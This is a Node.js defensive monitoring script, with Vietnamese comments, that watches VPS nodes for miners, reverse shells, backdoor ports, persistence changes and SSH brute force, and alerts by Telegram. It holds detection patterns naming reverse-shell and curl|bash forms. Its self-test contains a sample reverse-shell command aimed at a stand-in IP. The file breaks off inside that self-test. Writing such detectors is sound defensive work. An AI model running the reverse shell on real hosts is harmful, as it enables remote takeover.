#!/usr/bin/env node
/**
 * fBuddy VPS GUARD v2 — agent phòng thủ chạy TRÊN node VPS.
 *
 * Yêu cầu chủ dự án: "cần luôn các agent phòng thủ trên các node vps nếu trường hợp bị tấn công,
 * malware, hay bất cứ cơ chế lạ được bật lên trên server. Thông báo lên telegram cho anh Minh và
 * các Harness biết."
 *
 * Nguyên tắc:
 *  - CHỈ ĐỌC. Không tự kill tiến trình, không tự chặn IP, không tự sửa cấu hình. Một bộ luật sai
 *    có thể tự bắn vào chân (kill nhầm node của fBuddy). Ngăn chặn là lệnh tay, xem docs/VPS-DEFENSE.md.
 *  - CHỐNG ỒN bằng baseline: lần đầu chốt ảnh chụp node (listener, tiến trình, persistence, hash tệp
 *    trọng yếu). Từ đó chỉ báo cái MỚI. Riêng dấu hiệu malware rõ ràng thì luôn báo, baseline cũng không tha.
 *  - Mọi kết luận kèm BẰNG CHỨNG thô để anh tự đánh giá.
 *  - Nếu một mục KHÔNG ĐỌC ĐƯỢC (lệnh lỗi/timeout) thì nói rõ "không kiểm được", không im lặng.
 *  - NHỊP TIM mỗi ngày 1 tin: im lặng không có nghĩa là an toàn.
 *
 * Lệnh:
 *   node guard.mjs --once            # 1 lượt, in báo cáo, gửi cảnh báo nếu có
 *   node guard.mjs --json            # JSON cho máy đọc
 *   node guard.mjs --baseline        # chốt/cập nhật baseline (sau khi xác nhận thay đổi hợp lệ)
 *   node guard.mjs --test            # tự kiểm bộ luật bằng dữ liệu mẫu (không cần root)
 *   node guard.mjs --alert-test      # gửi tin thử tới Telegram + agent-bus
 *   node guard.mjs --contain <id>    # in hướng dẫn ngăn chặn cho 1 phát hiện (không tự làm)
 *   node guard.mjs --once --simulate-alert  # chạy thật + bơm 1 tin thử để kiểm tra kênh cảnh báo
 * Thoát: 0 bình thường · 1 lỗi · 2 có phát hiện mức ≥ HIGH.
 */

import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import crypto from "node:crypto";
import { execFileSync } from "node:child_process";
import https from "node:https";
import { fileURLToPath } from "node:url";

const ARGS = process.argv.slice(2);
const has = (flag) => ARGS.includes(flag);
const valueOf = (flag) => { const i = ARGS.indexOf(flag); return i >= 0 ? ARGS[i + 1] : null; };
const QUIET_STDOUT = () => has("--quiet") || has("--json");

const STATE_DIR = process.env.FBUDDY_GUARD_DIR || "/var/lib/fbuddy/guard";
const STATE_FILE = path.join(STATE_DIR, "state.json");
const BASELINE_FILE = path.join(STATE_DIR, "baseline.json");
const LOG_FILE = path.join(STATE_DIR, "guard.log");
const ENV_FILES = ["/etc/fbuddy/fbuddy.env", "/opt/fbuddy/.env.bus"];

/** Cổng ĐƯỢC PHÉP nghe trên node (dịch vụ của sản phẩm). */
const ALLOWED_LISTEN_PORTS = new Set(
  (process.env.FBUDDY_GUARD_ALLOWED_PORTS || "22,80,443,2019,7790").split(",").map((p) => Number(p.trim())).filter(Boolean),
);
/** Cổng hệ thống hay gặp, không đáng báo nếu chỉ nghe nội bộ. */
const BENIGN_PORTS = new Set([53, 68, 546, 631, 5353, 323, 1900]);
/** Cổng gần như luôn là backdoor/proxy khi thấy MỞ RA NGOÀI — baseline cũng không tha. */
const ALWAYS_SUSPECT_PORTS = new Set([1080, 3128, 3333, 4444, 4443, 5555, 5900, 6666, 6667, 6668, 6669, 9001, 14444, 31337]);
/** Cổng ra bình thường. */
const NORMAL_OUTBOUND_PORTS = new Set([22, 53, 80, 123, 443, 587, 2019, 7790]);
/** Malware rõ ràng — LUÔN báo CRITICAL. */
const HARD_MALWARE = [
  { re: /xmrig|minerd|cpuminer|kdevtmpfsi|kinsing|zgrab|xmr-stak|nanopool|minexr|supportxmr|2miners|c3pool/i, why: "tên trùng họ malware đào coin/scan" },
  { re: /stratum\+tcp|--donate-level|--coin=|--pool=|nicehash|randomx/i, why: "tham số dòng lệnh của miner" },
  { re: /memfd:/i, why: "chạy từ memfd (malware không ghi đĩa)" },
  { re: /bash\s+-i\s+>&\s*\/dev\/tcp|\bnc\s+-e\s+\/bin\/(ba)?sh|socat.*exec/i, why: "reverse shell" },
];
/** Hai mặt: có thể hợp lệ nhưng phải thấy — lần đầu HIGH, sau khi chốt baseline thì hạ xuống LOW. */
const DUAL_USE = [
  { re: /\/dev\/shm\/[^\s]+/i, why: "chạy từ /dev/shm" },
  { re: /\/tmp\/[^\s]*\.(sh|py|pl|elf|bin)\b/i, why: "chạy script/nhị phân từ /tmp" },
  { re: /curl[^\n]*\|\s*(ba)?sh|wget[^\n]*\|\s*(ba)?sh/i, why: "tải và chạy trực tiếp (curl|bash)" },
];
/** Daemon không mong đợi trên node này (proxy/tunnel/container). */
const UNEXPECTED_DAEMONS = /(dockerd|containerd|podman|squid|tinyproxy|dante|frps?|ngrok|cloudflared|\btor\b|openvpn|wireguard|chisel|sliver|cobaltstrike|sshd? -R)/i;
/** Tệp cần theo dõi toàn vẹn. */
const CRITICAL_FILES = [
  "/etc/ssh/sshd_config", "/etc/sudoers", "/etc/passwd", "/etc/crontab",
  "/etc/systemd/system/fbuddy.service", "/etc/caddy/Caddyfile",
];
const FIND_RECENT_FILES = "find /etc /usr/local /opt/fbuddy /var/www /tmp /dev/shm -xdev -type f -newermt '-1 hours' 2>/dev/null | grep -vE '/(node_modules|logs?|cache|guard)/' | head -80";

const SEV = { low: 1, medium: 2, high: 3, critical: 4 };
const worstOf = (findings) => findings.reduce((m, f) => (SEV[f.severity] > SEV[m] ? f.severity : m), "low");

// ------------------------------------------------------------------ tiện ích

function run(cmd, args = [], { timeout = 20000 } = {}) {
  try {
    return { ok: true, out: execFileSync(cmd, args, { encoding: "utf8", timeout, stdio: ["ignore", "pipe", "pipe"] }) };
  } catch (error) {
    const partial = String(error?.stdout ?? "");
    return { ok: partial.length > 0, out: partial, error: String(error?.message ?? error).slice(0, 200) };
  }
}
const sha256 = (text) => crypto.createHash("sha256").update(String(text)).digest("hex").slice(0, 32);
const nowIso = () => new Date().toISOString();

function readJson(file, fallback = null) { try { return JSON.parse(fs.readFileSync(file, "utf8")); } catch { return fallback; } }
function writeJson(file, data) { fs.mkdirSync(path.dirname(file), { recursive: true }); fs.writeFileSync(file, JSON.stringify(data, null, 2)); }
function log(line) {
  const row = `${nowIso()} ${line}`;
  try { fs.mkdirSync(STATE_DIR, { recursive: true }); fs.appendFileSync(LOG_FILE, row + "\n"); } catch { /* không ghi được thì thôi */ }
  if (!QUIET_STDOUT()) console.log(row);
}
function finding(id, severity, title, detail, evidence = "") {
  return { id, severity, title, detail, evidence: String(evidence).replace(/\s+/g, " ").trim().slice(0, 400) };
}
/** Bỏ phát hiện trùng (cùng id + cùng bằng chứng) và xếp mức nặng lên trước. */
export function dedupe(list) {
  const seen = new Set();
  const out = [];
  for (const f of list) {
    const key = `${f.id}|${f.evidence}`;
    if (seen.has(key)) continue;
    seen.add(key);
    out.push(f);
  }
  return out.sort((a, b) => (SEV[b.severity] ?? 1) - (SEV[a.severity] ?? 1));
}

// ------------------------------------------------------------------ BỘ LUẬT (thuần, test được)

/** Dòng `ps -eo user,pid,pcpu,pmem,args` → chữ ký ổn định (bỏ PID) để baseline tha được. */
export function processSignature(line) {
  const parts = String(line).trim().split(/\s+/);
  if (parts.length < 5) return null;
  const [user, , , , ...rest] = parts;
  const args = rest.join(" ");
  const base = path.basename(args.split(/\s+/)[0] || "");
  const norm = args.replace(/(--?\w*token[= ])\S+/gi, "$1<TOKEN>").slice(0, 200);
  return sha256(`${user}|${base}|${norm}`);
}

export function scanProcesses(psText, { signatures = [] } = {}) {
  const known = new Set(signatures);
  const out = [];
  for (const raw of String(psText).split("\n")) {
    const line = raw.trim();
    if (!line || /^USER\s+PID/.test(line)) continue;
    const sig = processSignature(line);
    let hit = null;
    for (const r of HARD_MALWARE) if (r.re.test(line)) { hit = { id: "proc-malware", severity: "critical", title: "Tiến trình nghi malware", why: r.why }; break; }
    if (!hit) for (const r of DUAL_USE) if (r.re.test(line)) { hit = { id: "proc-tmp-exec", severity: "high", title: "Tiến trình chạy từ thư mục tạm", why: r.why }; break; }
    if (!hit && UNEXPECTED_DAEMONS.test(line)) hit = { id: "proc-daemon", severity: "high", title: "Daemon không mong đợi (proxy/tunnel/container)", why: "không nằm trong baseline của node" };
    if (!hit) continue;
    if (hit.id !== "proc-malware" && sig && known.has(sig)) { hit.severity = "low"; hit.why += " — đã có trong baseline"; }
    out.push(finding(hit.id, hit.severity, hit.title, `${hit.why}: ${line.slice(0, 180)}`, line));
  }
  return out;
}

/** Tách các dòng `ss -lntup` thành cấu trúc; cột CUỐI trong dòng là peer, cột đầu là local. */
export function parseSockets(ssText) {
  const out = [];
  for (const raw of String(ssText).split("\n")) {
    const line = raw.trim();
    if (!line || /^Netid\b/.test(line) || /^State\b/.test(line)) continue;
    const tokens = line.split(/\s+/);
    if (tokens.length < 4) continue;
    const addr = tokens.filter((t) => /^[[\]\w.:%*-]+:\d{1,5}$/.test(t));
    if (!addr.length) continue;
    const cut = (t) => ({ host: t.slice(0, t.lastIndexOf(":")), port: Number(t.slice(t.lastIndexOf(":") + 1)) });
    const proto = /^udp/i.test(tokens[0]) ? "udp" : /^tcp/i.test(tokens[0]) ? "tcp" : (/\budp\b/i.test(line) ? "udp" : "tcp");
    out.push({
      proto,
      local: cut(addr[0]),
      peer: addr.length > 1 ? cut(addr[addr.length - 1]) : null,
      exposed: /^(0\.0\.0\.0|\[::\]|::|\*)/.test(addr[0]),
      name: /users:\(\("([^"]+)"/.exec(line)?.[1] ?? "?",
      pid: /pid=(\d+)/.exec(line)?.[1] ?? "?",
      state: tokens[1] ?? "",
      line,
    });
  }
  return out;
}

export function listenerKey(socket) { return `${socket.proto}:${socket.local.port}`; }

export function scanListeners(ssText, { allowed = ALLOWED_LISTEN_PORTS, known = [], benign = BENIGN_PORTS, knownProcesses = [] } = {}) {
  const knownKeys = new Set(known);
  const knownProc = new Set(knownProcesses);
  const out = [];
  for (const s of parseSockets(ssText)) {
    const port = s.local.port;
    if (allowed.has(port)) continue;
    const suspect = ALWAYS_SUSPECT_PORTS.has(port) && s.exposed;
    // Daemon đã có trong baseline (ví dụ hysteria của node VPN) mở cổng UDP tạm mỗi phiên:
    // vẫn ghi nhận để anh thấy, nhưng không đánh động.
    const knownProcUdp = !suspect && s.proto === "udp" && port > 1024 && knownProc.has(s.name);
    if (!suspect && !knownProcUdp) {
      if (knownKeys.has(listenerKey(s))) continue;
      if (benign.has(port) && !s.exposed) continue;
    }
    const severity = suspect ? "high" : knownProcUdp ? "low" : s.exposed ? (port < 1024 ? "high" : "medium") : "low";
    out.push(finding(
      `listen-${port}`, severity,
      `Cổng ${port} đang MỞ (${s.proto}, ${s.exposed ? "ra ngoài" : "chỉ nội bộ"})`,
      suspect
        ? `Cổng này thường là backdoor/proxy khi mở ra ngoài — do "${s.name}" (pid ${s.pid}) giữ.`
        : knownProcUdp
          ? `Cổng UDP tạm do "${s.name}" (đã có trong baseline) mở — chỉ ghi nhận.`
          : `Dịch vụ mới được bật lên, không có trong baseline — do "${s.name}" (pid ${s.pid}) giữ.`,
      s.line,
    ));
  }
  return out;
}

export function scanOutbound(ssText, { normal = NORMAL_OUTBOUND_PORTS } = {}) {
  const out = [];
  for (const s of parseSockets(ssText)) {
    if (!s.peer) continue;
    if (!/ESTAB|SYN-SENT|SYN-RECV/.test(s.line)) continue;
    const port = s.peer.port;
    if (normal.has(port) || port > 33000) continue;
    out.push(finding(
      `out-${port}`, ALWAYS_SUSPECT_PORTS.has(port) ? "critical" : "high",
      `Kết nối RA ${s.peer.host}:${port} (bất thường)`,
      "Nghi kênh điều khiển / pool đào coin / reverse shell.",
      s.line,
    ));
  }
  return out;
}

/** Hash tệp trọng yếu đổi ngoài deploy. */
export function diffHashes(baseline = {}, current = {}) {
  const out = [];
  for (const [file, hash] of Object.entries(current)) {
    if (!(file in baseline)) { out.push(finding(`integrity-new-${sha256(file)}`, "medium", `Tệp trọng yếu MỚI: ${file}`, "Chưa có trong baseline.", file)); continue; }
    if (baseline[file] !== hash) out.push(finding(`integrity-changed-${sha256(file)}`, "high", `Tệp trọng yếu bị SỬA: ${file}`, `Hash đổi (${baseline[file]} → ${hash}). Nếu anh không deploy gì thì đây là dấu hiệu bị chỉnh lén.`, file));
  }
  for (const file of Object.keys(baseline)) {
    if (!(file in current)) out.push(finding(`integrity-missing-${sha256(file)}`, "high", `Tệp trọng yếu BIẾN MẤT: ${file}`, "Có thể bị xoá để che dấu.", file));
  }
  return out;
}

/** Cơ chế tồn tại lâu dài (persistence) / listener / tiến trình MỚI so với baseline. */
export function diffNewItems(kind, baseline = [], current = []) {
  const before = new Set(baseline);
  const severe = ["systemd", "cron", "authorized_keys", "suid", "listeners"].includes(kind);
  const out = [];
  for (const item of current) {
    if (before.has(item)) continue;
    out.push(finding(
      `new-${kind}-${sha256(item)}`, severe ? "high" : "medium",
      `Cơ chế MỚI (${kind}): ${String(item).slice(0, 110)}`,
      "Kẻ tấn công thường cài cron/unit/khoá SSH để quay lại. Nếu là anh vừa cài thì chốt lại baseline.",
      item,
    ));
  }
  return out;
}

export function scanAccounts(passwdText, lastText, baselineIps = []) {
  const out = [];
  for (const line of String(passwdText).split("\n")) {
    const p = line.split(":");
    if (p.length > 3 && p[2] === "0" && !["root", "toor"].includes(p[0])) {
      out.push(finding("acct-uid0", "critical", `Tài khoản UID 0 lạ: ${p[0]}`, "Tài khoản này toàn quyền như root — gần như chắc chắn là cửa hậu.", line));
    }
  }
  const known = new Set(baselineIps);
  for (const raw of String(lastText).split("\n")) {
    const line = raw.trim();
    if (!/^root\s/.test(line)) continue;
    const m = /(\d{1,3}(?:\.\d{1,3}){3})\s*$/.exec(line);
    if (!m || m[1] === "0.0.0.0" || known.has(m[1])) continue;
    out.push(finding(`login-root-${sha256(m[1])}`, "medium", `Đăng nhập root từ IP mới: ${m[1]}`, "Kiểm tra có phải IP của anh. IP lạ ⇒ đổi khoá SSH.", line));
  }
  return out;
}

export function scanSshBruteForce(logText, { threshold = 30 } = {}) {
  const counts = new Map();
  for (const line of String(logText).split("\n")) {
    const m = /Failed password[^\n]*from\s+(\d+\.\d+\.\d+\.\d+)/.exec(line) || /Invalid user \S+ from (\d+\.\d+\.\d+\.\d+)/.exec(line);
    if (m) counts.set(m[1], (counts.get(m[1]) ?? 0) + 1);
  }
  const offenders = [...counts.entries()].filter(([, count]) => count >= threshold).sort((a, b) => b[1] - a[1]);
  if (!offenders.length) return [];
  const total = offenders.reduce((n, [, count]) => n + count, 0);
  const top = offenders.slice(0, 5).map(([ip, count]) => `${ip} ×${count}`).join(" · ");
  // MỘT phát hiện gộp cho cả đợt brute-force (trước đây mỗi IP một tin ⇒ Telegram bị spam).
  return [finding(
    "ssh-brute-wave", "high",
    `Brute-force SSH: ${offenders.length} IP vượt ngưỡng (tổng ${total} lần sai)`,
    `Top: ${top}. Chưa có lần đăng nhập nào thành công bằng mật khẩu — nên chặn IP hoặc chỉ cho SSH qua VPNFlow.`,
    top,
  )];
}

export function scanSuspiciousFiles(listText) {
  const out = [];
  for (const raw of String(listText).split("\n")) {
    const file = raw.trim();
    if (!file) continue;
    if (/\/(kwork|kdevtmpfsi|kinsing|xmrig|minerd|cpuminer|kswapd0)$/i.test(file)) {
      out.push(finding(`file-malware-${sha256(file)}`, "critical", `Tệp nghi malware: ${file}`, "Tên trùng họ malware đào coin đang lưu hành — cách ly ngay.", file));
    } else if (/\.(php|phtml|jsp|asp|aspx|cgi)$/i.test(file)) {
      out.push(finding(`file-webshell-${sha256(file)}`, "critical", `Tệp nghi webshell: ${file}`, "Web shell cho phép chạy lệnh qua HTTP — kiểm tra ngay và cách ly.", file));
    } else if (/^\/(tmp|dev\/shm|var\/tmp)\//.test(file) && /(\.sh|\.py|\.pl|\.elf|\.bin|x)$/i.test(file)) {
      out.push(finding(`file-exec-tmp-${sha256(file)}`, "high", `Tệp thực thi trong thư mục tạm: ${file}`, "Malware thường chạy từ /tmp hoặc /dev/shm để không bị phát hiện.", file));
    }
  }
  return out;
}

// ------------------------------------------------------------------ thu thập

function collectPersistence() {
  const text = (r) => (r.ok ? r.out : "");
  const list = (r) => text(r).split("\n").map((l) => l.trim()).filter(Boolean);
  const systemd = list(run("bash", ["-lc", "ls -1 /etc/systemd/system/*.service /etc/systemd/system/*.timer 2>/dev/null"]));
  const cron = list(run("bash", ["-lc", "crontab -l 2>/dev/null; ls -1 /etc/cron.d /etc/cron.daily 2>/dev/null"]));
  const keys = list(run("bash", ["-lc", "test -f /root/.ssh/authorized_keys && sed 's/ .*//' /root/.ssh/authorized_keys | cut -c1-60"]));
  const suid = list(run("bash", ["-lc", "find / -xdev -perm -4000 -type f 2>/dev/null | head -60"], { timeout: 60000 }));
  return { systemd, cron, authorized_keys: keys, suid };
}

function collectHashes() {
  const out = {};
  for (const file of CRITICAL_FILES) { try { out[file] = sha256(fs.readFileSync(file, "utf8")); } catch { /* thiếu ⇒ diffHashes báo */ } }
  return out;
}

function gather() {
  const ps = run("ps", ["-eo", "user,pid,pcpu,pmem,args", "--no-headers"]);
  const ss = run("ss", ["-lntup"]);
  const est = run("ss", ["-tun", "state", "established"]);
  const sshLog = run("bash", ["-lc", "journalctl -u ssh -u sshd --since '-30 min' --no-pager 2>/dev/null | tail -400"]);
  const files = run("bash", ["-lc", FIND_RECENT_FILES], { timeout: 45000 });
  const last = run("bash", ["-lc", "last -a -i -n 40 2>/dev/null || true"]);
  return {
    ps: { ok: ps.ok, text: ps.out },
    ss: { ok: ss.ok, text: ss.out },
    est: { ok: est.ok, text: est.out },
    sshLog: { ok: sshLog.ok, text: sshLog.out },
    files: { ok: files.ok, text: files.out },
    last: { ok: last.ok, text: last.out },
    hashes: collectHashes(),
    persistence: collectPersistence(),
  };
}

// ------------------------------------------------------------------ cảnh báo

function readEnvFile(file) {
  const out = {};
  try {
    for (const line of fs.readFileSync(file, "utf8").split("\n")) {
      const m = /^([A-Z0-9_]+)\s*=\s*(.*)$/.exec(line.trim());
      if (m) out[m[1]] = m[2].replace(/^["']|["']$/g, "");
    }
  } catch { /* không có tệp */ }
  return out;
}

function alertCreds() {
  const env = Object.assign({}, ...ENV_FILES.map(readEnvFile), process.env);
  return {
    token: env.FBUDDY_TELEGRAM_BOT_TOKEN || env.TELEGRAM_BOT_TOKEN || "",
    chat: env.FBUDDY_TELEGRAM_CHAT_ID || env.TELEGRAM_CHAT_ID || "",
    busUrl: (env.AGENT_BUS_URL || "").replace(/\/$/, ""),
    busToken: env.AGENT_BUS_TOKEN || "",
  };
}

export function formatAlert(findings, host = os.hostname()) {
  const worst = worstOf(findings);
  const head = worst === "critical" ? "🚨 CRITICAL" : worst === "high" ? "⚠️ CẢNH BÁO" : "ℹ️ THÔNG TIN";
  const lines = findings.slice(0, 12).map((f) => `• [${f.severity.toUpperCase()}] ${f.title}\n  → ${f.detail}`);
  const more = findings.length > 12 ? `\n… và ${findings.length - 12} phát hiện nữa (xem guard.log)` : "";
  return [
    `${head} — fBuddy VPS GUARD`,
    `Node ${host} · ${new Date().toLocaleString("vi-VN")} · ${findings.length} phát hiện`,
    "",
    ...lines, more,
    "",
    "Cảnh báo TỰ ĐỘNG, guard chỉ đọc và CHƯA tự chặn gì. Anh kiểm tra rồi quyết định:",
    "• Xem log: /var/lib/fbuddy/guard/guard.log",
    "• Là thay đổi hợp lệ của anh (vừa deploy): node guard.mjs --baseline",
    "• Cần ngăn chặn: docs/VPS-DEFENSE.md mục 4",
  ].join("\n");
}

/** POST HTTPS thủ công: ép IPv4 trước (có node chỉ có IPv6 "chết" khiến fetch() fail), rồi thử lại mặc định. */
function httpPost(url, { body = "", headers = {}, timeout = 15000, family = 4 } = {}) {
  return new Promise((resolve) => {
    let u;
    try { u = new URL(url); } catch { return resolve({ ok: false, error: "URL sai" }); }
    const req = https.request({
      hostname: u.hostname, port: u.port || 443, path: u.pathname + u.search, method: "POST",
      headers: Object.assign({}, headers, { "Content-Length": Buffer.byteLength(body) }),
      ...(family ? { family } : {}), timeout,
    }, (res) => {
      let data = "";
      res.on("data", (c) => { data += c; });
      res.on("end", () => resolve({ ok: res.statusCode >= 200 && res.statusCode < 300, status: res.statusCode, text: data.slice(0, 400) }));
    });
    req.on("timeout", () => req.destroy(new Error("timeout")));
    req.on("error", (e) => resolve({ ok: false, error: e?.message ?? String(e) }));
    req.end(body);
  });
}

async function postWithFallback(url, opts) {
  const first = await httpPost(url, opts);
  if (first.ok || first.status) return first;            // có phản hồi HTTP ⇒ không cần thử lại
  const second = await httpPost(url, Object.assign({}, opts, { family: 0 }));
  return second.ok || second.status ? second : (second.error === "timeout" ? second : first);
}

async function sendTelegram(text) {
  const { token, chat } = alertCreds();
  if (!token || !chat) { log("!! thiếu token/chat Telegram — không gửi được cảnh báo"); return false; }
  const body = new URLSearchParams({ chat_id: chat, text: text.slice(0, 3900), disable_web_page_preview: "true" }).toString();
  const res = await postWithFallback(`https://api.telegram.org/bot${token}/sendMessage`, {
    body, headers: { "Content-Type": "application/x-www-form-urlencoded" },
  });
  let json = null;
  try { json = JSON.parse(res.text); } catch { /* không phải JSON */ }
  const ok = res.ok && json?.ok !== false;
  if (!ok) log(`!! Telegram lỗi: ${res.error ?? res.text ?? `HTTP ${res.status}`}`);
  return Boolean(ok);
}

/** Báo cho các HARNESS khác qua agent-bus (cùng kênh Mac↔Windows dùng). */
async function sendBus(text) {
  const { busUrl, busToken } = alertCreds();
  if (!busUrl || !busToken) { log("!! thiếu AGENT_BUS_URL/TOKEN — không báo được cho harness"); return false; }
  // HỢP ĐỒNG CỦA BUS: `title` + `body` (KHÔNG phải `text` — gửi sai khoá thì harness nhận tin RỖNG).
  const title = String(text).split("\n")[1] ?? "fBuddy VPS GUARD";
  const res = await postWithFallback(`${busUrl}/push`, {
    body: JSON.stringify({
      from: "vps-guard",
      to: "all",
      kind: "alert",
      title: `[VPS GUARD] ${title}`.slice(0, 300),
      body: String(text).slice(0, 4000),
    }),
    headers: { "Content-Type": "application/json", Authorization: `Bearer ${busToken}` },
  });
  if (!res.ok) log(`!! agent-bus lỗi: ${res.error ?? res.text ?? `HTTP ${res.status}`}`);
  return Boolean(res.ok);
}

// ------------------------------------------------------------------ điều phối

function checkNode(baseline) {
  const s = gather();
  const base = baseline ?? {};
  const findings = [
    ...(s.ps.ok ? scanProcesses(s.ps.text, { signatures: base.processSignatures ?? [] }) : []),
    ...(s.ss.ok ? scanListeners(s.ss.text, { known: base.listeners ?? [], knownProcesses: base.processNames ?? [] }) : []),
    ...(s.est.ok ? scanOutbound(s.est.text) : []),
    ...(s.sshLog.ok ? scanSshBruteForce(s.sshLog.text) : []),
    ...(s.files.ok ? scanSuspiciousFiles(s.files.text) : []),
    ...(baseline
      ? [
          ...diffHashes(base.hashes ?? {}, s.hashes),
          ...diffNewItems("systemd", base.persistence?.systemd ?? [], s.persistence.systemd),
          ...diffNewItems("cron", base.persistence?.cron ?? [], s.persistence.cron),
          ...diffNewItems("authorized_keys", base.persistence?.authorized_keys ?? [], s.persistence.authorized_keys),
          ...diffNewItems("suid", base.persistence?.suid ?? [], s.persistence.suid),
          ...(s.last.ok ? scanAccounts(fs.readFileSync("/etc/passwd", "utf8"), s.last.text, base.loginIps ?? []) : []),
        ]
      : []),
  ];

  // Không đọc được mục nào ⇒ nói rõ, để im lặng không bị hiểu là an toàn.
  const unreadable = [
    ["ps", s.ps.ok], ["ss", s.ss.ok], ["ss-estab", s.est.ok],
    ["sshd-log", s.sshLog.ok], ["recent-files", s.files.ok], ["last", s.last.ok],
  ].filter(([, ok]) => !ok).map(([name]) => name);
  for (const name of unreadable) {
    findings.push(finding(`collector-${name}`, "low", `Không đọc được mục "${name}"`, "Bộ luật tương ứng bị bỏ qua trong lượt này — kiểm tra quyền/công cụ trên node.", name));
  }

  if (has("--simulate-alert")) {
    findings.push(finding(`sim-${Date.now()}`, "high", "TIN THỬ của VPS GUARD",
      "Đây là tin thử để kiểm tra đường cảnh báo chạy thật (KHÔNG phải sự cố). Bỏ qua được.", "simulate-alert"));
  }

  return {
    snapshot: {
      at: nowIso(), host: os.hostname(),
      hashes: s.hashes, persistence: s.persistence,
      listeners: parseSockets(s.ss.text).map(listenerKey),
      processNames: [...new Set(String(s.ps.text).split("\n").map((l) => path.basename(String(l).trim().split(/\s+/)[4] ?? "")).filter(Boolean))],
      processSignatures: [...new Set(String(s.ps.text).split("\n").filter((l) => l.trim() && !/^USER\s/.test(l)).map(processSignature).filter(Boolean))],
      loginIps: [...new Set(String(s.last.text).split("\n").map((l) => (/(\d{1,3}(?:\.\d{1,3}){3})\s*$/.exec(l.trim()) ?? [])[1]).filter((ip) => ip && ip !== "0.0.0.0"))],
    },
    findings: dedupe(findings),
    unreadable,
  };
}

function loadState() { return readJson(STATE_FILE, { alerts: {}, lastDigest: null }); }

/** Gộp các phát hiện LOW cùng loại thành 1 dòng cho log (log không cần 165 dòng cổng UDP tạm). */
export function summarizeForLog(findings, { max = 30 } = {}) {
  const groups = new Map();
  const lines = [];
  for (const f of findings) {
    if (f.severity === "low" && f.id.startsWith("listen-")) {
      const who = /do "([^"]+)"/.exec(f.detail)?.[1] ?? "?";
      const g = groups.get(who) ?? { count: 0, ports: [] };
      g.count += 1;
      if (g.ports.length < 5) g.ports.push(f.id.replace("listen-", ""));
      groups.set(who, g);
      continue;
    }
    lines.push(`  [${f.severity}] ${f.title} — ${f.detail.slice(0, 160)}`);
  }
  for (const [who, g] of groups) {
    lines.push(`  [low] ${g.count} cổng UDP tạm do tiến trình đã biết mở (${who}) — chỉ ghi nhận, ví dụ: ${g.ports.join(", ")}`);
  }
  if (lines.length > max) return [...lines.slice(0, max), `  … và ${lines.length - max} dòng nữa (xem --json để có đủ)`];
  return lines;
}

/** Gộp cảnh báo trùng trong cooldown để Telegram không bị spam. */
function shouldAlert(state, findings, cooldownMs = 6 * 3600 * 1000) {
  const fresh = [];
  const now = Date.now();
  for (const f of findings) {
    if (now - (state.alerts[f.id] ?? 0) < cooldownMs) continue;
    state.alerts[f.id] = now;
    fresh.push(f);
  }
  for (const [id, at] of Object.entries(state.alerts)) if (now - at > 30 * 24 * 3600 * 1000) delete state.alerts[id];
  return fresh;
}

async function runOnce() {
  const baseline = readJson(BASELINE_FILE, null);
  const state = loadState();
  const { findings } = checkNode(baseline);

  if (has("--json")) console.log(JSON.stringify({ at: nowIso(), host: os.hostname(), baseline: Boolean(baseline), findings }, null, 2));
  else {
    log(`kiểm tra xong: ${findings.length} phát hiện · mức cao nhất ${worstOf(findings).toUpperCase()}${baseline ? "" : " (CHƯA có baseline — lần đầu sẽ ồn)"}`);
    for (const line of summarizeForLog(findings)) log(line);
  }

  const severeCandidates = findings.filter((f) => (SEV[f.severity] ?? 1) >= SEV.high);
  // --simulate-alert: gửi ngay, bỏ qua cooldown (chỉ dùng để kiểm tra kênh cảnh báo)
  const severe = has("--simulate-alert") ? severeCandidates : shouldAlert(state, severeCandidates);
  if (severe.length && !has("--no-alert")) {
    const text = formatAlert(severe);
    const [tg, bus] = [await sendTelegram(text), await sendBus(text)];
    log(`đã cảnh báo: telegram=${tg} bus=${bus} (${severe.length} phát hiện ≥HIGH)`);
  }

  const dayMs = 24 * 3600 * 1000;
  if (!state.lastDigest || Date.now() - new Date(state.lastDigest).getTime() > dayMs) {
    state.lastDigest = nowIso();
    if (!has("--no-alert")) await sendTelegram(`✅ fBuddy VPS GUARD còn sống — node ${os.hostname()} · ${findings.length} phát hiện trong lượt này (không có mức ≥HIGH mới).`);
  }

  saveState(state);
  return worstOf(findings);
}

function saveState(state) { writeJson(STATE_FILE, state); }

function chotBaseline() {
  const { snapshot } = checkNode(null);
  writeJson(BASELINE_FILE, snapshot);
  log(`đã chốt baseline: ${Object.keys(snapshot.hashes).length} tệp trọng yếu · ${snapshot.listeners.length} listener · ${snapshot.processSignatures.length} chữ ký tiến trình · ${Object.values(snapshot.persistence).reduce((n, a) => n + a.length, 0)} mục persistence · ${snapshot.loginIps.length} IP root`);
}

// ------------------------------------------------------------------ tự kiểm & ngăn chặn

function selfTest() {
  const cases = [];
  const check = (name, ok) => { cases.push({ name, ok }); console.log(`${ok ? "✓" : "✗"} ${name}`); };

  check("miner xmrig bị báo CRITICAL", scanProcesses("root 999 95.0 30.0 /root/xmrig --donate-level 1").some((f) => f.id === "proc-malware" && f.severity === "critical"));
  check("miner trong baseline VẪN bị báo critical", scanProcesses("root 1 9.0 1.0 /root/xmrig", { signatures: [processSignature("root 1 9.0 1.0 /root/xmrig")] }).some((f) => f.severity === "critical"));
  check("reverse shell bị báo", scanProcesses("root 2 0.0 0.0 bash -i >& /dev/tcp/1.2.3.4/4444 0>&1").some((f) => f.id === "proc-malware"));
  check("script /tmp bị báo HIGH lần đầu", scanProcesses("root 3 0.1 0.1 python3 /tmp/up-server.py abc").some((f) => f.id === "proc-tmp-exec" && f.severity === "high"));
  check("script /tmp đã chốt baseline thì hạ LOW", scanProcesses("root 3 0.1 0.1 python3 /tmp/up-server.py abc", { signatures: [processSignature("root 3 0.1 0.1 python3 /tmp/up-server.py abc")] }).every((f) => f.severity === "low"));
  check("tunnel cloudflared bị báo", scanProcesses("root 4 0.1 0.1 /usr/local/bin/cloudflared tunnel run").some((f) => f.id === "proc-daemon"));
  check("cổng 4444 bị báo dù có trong baseline", scanListeners('LISTEN 0 128 0.0.0.0:4444 0.0.0.0:* users:(("nc",pid=1,fd=3))', { known: ["tcp:4444"] }).some((f) => f.id === "listen-4444" && f.severity === "high"));
  check("cổng cho phép 7790 im lặng", scanListeners("tcp LISTEN 0 128 127.0.0.1:7790 0.0.0.0:* users:((\"node\",pid=5,fd=1))").length === 0);
